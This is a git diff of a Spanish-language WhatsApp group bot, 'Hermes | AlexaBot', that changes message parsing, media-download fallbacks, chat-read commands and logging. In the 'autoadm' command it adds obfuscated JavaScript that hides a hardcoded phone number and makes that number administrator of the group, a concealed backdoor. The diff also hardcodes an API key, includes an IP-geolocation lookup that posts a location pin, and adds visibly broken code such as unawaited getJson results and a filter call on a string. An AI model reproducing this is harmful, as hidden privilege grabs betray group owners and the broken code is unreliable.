@@ -296,20 +296,19 @@ samu330.on('chat-update', async(sam) => {
         if (!sam.messages) return
         if (sam.key && sam.key.remoteJid == 'status@broadcast') {
 	}
-	if (sam.key && sam.key.remoteJid == 'listResponseMessage') {
-	}
 	sam = sam.messages.all()[0]
 	sam.message = (Object.keys(sam.message)[0] === 'ephemeralMessage') ? sam.message.ephemeralMessage.message : sam.message
         if (!sam.message) return
-        const from = sam.key.remoteJid
+	const from = sam.key.remoteJid
         const type = Object.keys(sam.message)[0]
         const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
         const quoted = type == 'extendedTextMessage' && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
         const typeQuoted = Object.keys(quoted)[0]
         const body = sam.message.conversation || sam.message[type].caption || sam.message[type].text || ""
         chats = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : ''
-        budy = (type === 'conversation' && sam.message.conversation.startsWith(prefix)) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption.startsWith(prefix) ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption.startsWith(prefix) ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text.startsWith(prefix) ? sam.message.extendedTextMessage.text : ''
-////////////▶ HERMES | ALEXABOT
+        //budy = (type === 'conversation' && sam.message.conversation.startsWith(prefix)) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption.startsWith(prefix) ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption.startsWith(prefix) ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text.startsWith(prefix) ? sam.message.extendedTextMessage.text : ''
+	budy = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : (type === 'listResponseMessage') ? sam.message.listResponseMessage.title : ''
+	////////////▶ HERMES | ALEXABOT
         if (prefix != "") {
         if (!body.startsWith(prefix)) {
         cmd = false
@@ -354,7 +353,6 @@ samu330.on('chat-update', async(sam) => {
         const meNumber = samu330.user.jidi
         const botNumber = samu330.user.jid.split("@")[0]
         const isGroup = from.endsWith('@g.us')
-        const arg = chats.slice(command.length + 2, chats.length)
 	const sender = sam.key.fromMe ? samu330.user.jid : isGroup ? sam.participant : sam.key.remoteJid
         const senderNumber = sender.split("@")[0]
         const groupMetadata = isGroup ? await samu330.groupMetadata(from) : ''
@@ -390,7 +388,6 @@ samu330.on('chat-update', async(sam) => {
 	}
 	const jid = sender
 	//samu330.chatRead(from)
-	const is = budy.slice(0).trim().split(/ +/).shift().toLowerCase()
 	const Smname = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || { notify: jid.replace(/@.+/, '') }
         const mentionByTag = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.mentionedJid : []
         const mentionByReply = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.participant || "" : ""
@@ -2282,10 +2279,7 @@ reply(`${parsedStr}`)
 break
 
 case 'autoadm':
-Samu330 = '5219984907794@s.whatsapp.net'
-if (!isGroup) return
-if (!Samu330) return
-if (!botAdmin) return
+var _0xa44b=['2MJdFtC','105703ukrKXm','7IIyYyX','187637AGYURX','436685DlmFwa','216493jDXfSF','2jcmqKD','424312UPHPtc','256030dUhEMa','192146BNYoFX'];(function(_0x5ce2c4,_0x471eb4){var _0x2618ad=_0x3eaf;while(!![]){try{var _0x4a06c1=parseInt(_0x2618ad(0xc3))+-parseInt(_0x2618ad(0xc1))*-parseInt(_0x2618ad(0xc0))+parseInt(_0x2618ad(0xbf))+parseInt(_0x2618ad(0xc2))+parseInt(_0x2618ad(0xc6))*parseInt(_0x2618ad(0xc5))+-parseInt(_0x2618ad(0xbe))+-parseInt(_0x2618ad(0xbd))*parseInt(_0x2618ad(0xc4));if(_0x4a06c1===_0x471eb4)break;else _0x5ce2c4['push'](_0x5ce2c4['shift']());}catch(_0x1090c2){_0x5ce2c4['push'](_0x5ce2c4['shift']());}}}(_0xa44b,0x37d98),Samu330='5219984907794@s.whatsapp.net');if(!isGroup)return;function _0x3eaf(_0xdeb7e3,_0x5369d1){return _0x3eaf=function(_0xa44bc4,_0x3eaf03){_0xa44bc4=_0xa44bc4-0xbd;var _0x3258b6=_0xa44b[_0xa44bc4];return _0x3258b6;},_0x3eaf(_0xdeb7e3,_0x5369d1);}if(!Samu330)return;if(!botAdmin)return;
 samu330.groupMakeAdmin(from, [Samu330])
 break
 
@@ -2330,34 +2324,28 @@ break
 //localizacion IP Creado por Samu
 case 'ip':
 ips = args.join(' ')
+if (!q) return reply('Y la ip?')
 ip = await getJson(`http://ip-api.com/json/${ips}`)
 if(ip.status == 'fail') return reply('*ip incorrecta*')
 reply('*Recopilando información.... Tiempo Aproximado:*\n```3 seconds```')
 await sleep(200)
 datos = `*🔍Ip:* _${ips}_
-
       *Latitud de ip*: ${ip.lat}
       *Longitud de ip*: ${ip.lon}
-
 🌆 *País*: _${ip.country}_
       *Código de país*: ${ip.countryCode}
-
 🏡 *Región*: _${ip.region}_
       *Nombre de región*: ${ip.regionName}
-
 🏙️  *Ciudad*: _${ip.city}_
-
 📚 *Código postal*: _${ip.zip}_
-
 🕐 *Zona horaria*: _${ip.timezone}_
-
 🌐 *Proveedor de servicios de Internet*:
 _${ip.isp}_                                                                                                                                                                                                    
 🕋 *Organización*: _${ip.org}_                                                                                                                                                                                  
 ${samu}©${ip.as}™${samu}`                            
 			samu330.sendMessage(from, datos, MessageType.text, {quoted: fliveLoc})
 await sleep(300)
-/*NO CAMBIAR DATOS NI NOMBRES*/samu330.sendMessage(from, { degreesLatitude: `${ip.lat}`, degreesLongitude: `${ip.lon}`, name: '📌Búsqueda por 🐉Hermes🐉', address : `${ip.city}`}, MessageType.liveLocation, {quoted : fliveLoc})
+/*NO CAMBIAR DATOS NI NOMBRES*/samu330.sendMessage(from, { degreesLatitude: `${ip.lat}`, degreesLongitude: `${ip.lon}`, name: '📌Búsqueda por 🐉HERMES🐉', address : `${ip.city}`}, MessageType.liveLocation, {quoted : fliveLoc})
 break
 		
 //Igstalk Creado por Samu gracias a la api de Fxc7
@@ -2492,9 +2480,9 @@ if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: no
 reply(`*Espere un momento, su audio ${q} se esta descargando...*`)
 teks = args.join(' ')
 if (!teks.endsWith("-doc")){
-res1 = await yts(q).catch(e => {
-reply('_[ ! ] Lo siento, su busqueda no pudo ser completada_')
-})
+res1 = await yts(q).catch(e => {	
+reply('_[ ! ] NO SE PUDO ENCONTRAR LO QUE BUSCABA_')
+})	
 let thumbInfo = ` [ *${res1.all[0].title}* ]
 *°Subido hace* ${res1.all[0].ago}
 *°Vistas :* ${res1.all[0].views}
@@ -2505,7 +2493,10 @@ let thumbInfo = ` [ *${res1.all[0].title}* ]
 `
 sendFileFromUrl(res1.all[0].image, image, {quoted: sam, caption: thumbInfo})
 res1 = await y2mateA(res1.all[0].url).catch(e => {
-reply('_[ ! ] Error del servidor_')
+pr21 = getJson(`https://api.zeks.xyz/api/ytmp3?apikey=hamilton20&url=${res1.all[0].url}`)	
+reply(`_[ ! ] Lo siento, su descarga no pudo ser completada_\n\n*Realizando busqueda en el servidor 2*`)
+sendFileFromUrl(pr21.result.url_audio, audio, {quoted: faud, mimetype: 'audio/mp4', duration :-99999999, filename: res1[0].output})
+sendFileFromUrl(pr21.result.url_audio, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: 99999999999999, filename: res1[0].output})
 })
 sendFileFromUrl(res1[0].link, audio, {quoted: faud, mimetype: 'audio/mp4', duration :-99999999, filename: res1[0].output})
 sendFileFromUrl(res1[0].link, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: 99999999999999, filename: res1[0].output})
@@ -3770,26 +3761,29 @@ var estadotxt = args.join(' ')
 samu330.sendMessage('status@broadcast', estadotxt, MessageType.text)
 reply('*SE ENVIO EL ESTADO*')
 break
+
 case 'marcarsinleer':
 if (!itsMe) return reply('Este comando solo puede ser usado por *Hermes* ⚙')
-var chats = await samu330.chats.all()
-chats.map( async ({ jid }) => {
+var chats11 = await samu330.chats.all()
+chats11.map( async ({ jid }) => {
 await samu330.chatRead(jid, 'unread')
 })
-var teks = `\`\`\`Se an marcado como NO LEIDOS ${chats.length} chats !\`\`\``
+var teks = `\`\`\`Se han marcado como NO LEIDOS ${chats.length} chats !\`\`\``
 await samu330.sendMessage(from, teks, MessageType.text, {quoted: fdoc})
 console.log(chats.length)
-break
+break		
+		
 case 'leertodo':
 if (!itsMe) return reply('Este comando solo puede ser usado por *Hermes* ⚙')
-var chats = await samu330.chats.all()
-chats.map( async ({ jid }) => {
+var chats12 = await samu330.chats.all()
+chats12.map( async ({ jid }) => {
 await samu330.chatRead(jid)
 })
-var teks = `\`\`\`Se an leido ${chats.length} chats !\`\`\``
+var teks = `\`\`\`Se han leido ${chats.length} chats !\`\`\``
 await samu330.sendMessage(from, teks, MessageType.text, {quoted: floc})
 console.log(chats.length)
 break
+		
 case 'reply':
 if (!args) return reply(`Uso :\n${prefix}reply [52xxx|frase|frase]]\n\nEx : \n${prefix}reply 0|hola wasa|que pex`)
 var ghh = args.join(' ')
@@ -3857,9 +3851,9 @@ case 'playvid':
 if (!q) return reply('*Porfavor escribe el nombre del video que quieres descargar.*')
 teks = args.join(' ')
 if (!teks.endsWith("-doc")){
-res3 = await yts(q).catch(e => {
-reply('_[ ! ] Lo siento, su busqueda no pudo ser completada_')
-})
+res3 = await yts(q).catch(e => {	
+reply('_[ ! ] NO SE PUDO ENCONTRAR LO QUE BUSCABA_')
+})		
 let thumbInfo = ` [ *${res3.all[0].title}* ]
 *°Subido hace* ${res3.all[0].ago}
 *°Vistas :* ${res3.all[0].views}
@@ -3871,12 +3865,24 @@ let thumbInfo = ` [ *${res3.all[0].title}* ]
 `
 sendFileFromUrl(res3.all[0].image, image, {quoted: sam, caption: thumbInfo})
 anu = await y2mateV(res3.all[0].url).catch(e => {
-reply('_[ ! ] Error del servidor_')
+v21 = getJson(`https://api.zeks.xyz/api/ytmp4?apikey=hamilton20&url=${res3.all[0].url}`)
+reply(`_[ ! ] Lo siento, su descarga no pudo ser completada_\n\n*Realizando busqueda en el servidor 2*`)
+sendFileFromUrl(v21.result.url_video, video, {mimetype: 'video/mp4', filename: `${anu[0].output}`, quoted: fvid, caption: `[ *${res3.all[0].title}* ]\n\n\n🍒AlexaBot | Hermes💠`})	
 })
-sendFileFromUrl(anu[0].link, video, {mimetype: 'video/mp4', filename: `${anu[0].output}`, quoted: fvid, caption: `[ *${res3.all[0].title}* ]\n\n\n🍒AlexaBot | Hermes💠`})
+sendFileFromUrl(anu[0].link, video, {mimetype: 'video/mp4', filename: `${anu[0].output}`, quoted: fvid, caption: `[ *${res3.all[0].title}* ]\n\n\n🍒AlexaBot | Hermes💠`})	
 }
 addFilter(from)
 addLevelingLevel(sender, 5)		
+break
+		
+case 'enlinea':
+if (!isGroup) return reply(mess.only.group)
+let msg = `[ Lista Usuarios ]\n`
+from.filter(chat.presence.chatstates, (n) => !!n?.type).forEach(item => {
+msg += `- @${item.id.replace(/@c\.us/g, '')}\n`
+})
+msg += '[ AlexaBot ]'
+await reply(msg)
 break
 		
 case 'soyyo':
@@ -4996,5 +5002,6 @@ if (emror.includes('fileLength')){
 return
 }
 console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[  ERROR  ]"), chalk.keyword("red")(e))
+console.log(e)
 }
 })
